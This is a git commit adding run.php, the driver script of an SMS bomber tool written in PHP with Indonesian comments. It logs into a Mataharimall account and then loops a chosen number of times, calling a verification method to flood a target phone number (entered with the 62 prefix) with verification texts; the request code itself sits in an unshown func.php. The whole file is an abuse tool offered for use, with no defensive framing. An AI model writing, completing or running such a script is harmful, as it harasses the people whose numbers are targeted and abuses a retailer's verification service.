ddbf230b8b110ca40f2a4097772c4ab190399f3e
nee48 <34019257+nee48@users.noreply.github.com>
2017-11-27 13:13:23 +0700

    Add files via upload

---
+++ run.php
@@ -0,0 +1,15 @@
+<?php
+include 'func.php';
+
+$init = new Bom();
+// Konfigurasi Akun Mataharimall
+$init->email = ""; //Email Akun Mataharimall
+$init->pass = ""; //Password Akun Mataharimall
+$init->Login($init->email,$init->pass);
+
+//Eksekusi Sms Boomber
+$init->no = ""; //Nomer Hp tujuan Pakai awalan 62. contoh 6281xxxxxxx
+$loop = ""; //Jumlah eksekusi
+for ($i=0; $i < $loop; $i++) { 
+    $init->Verif($init->no);
+}
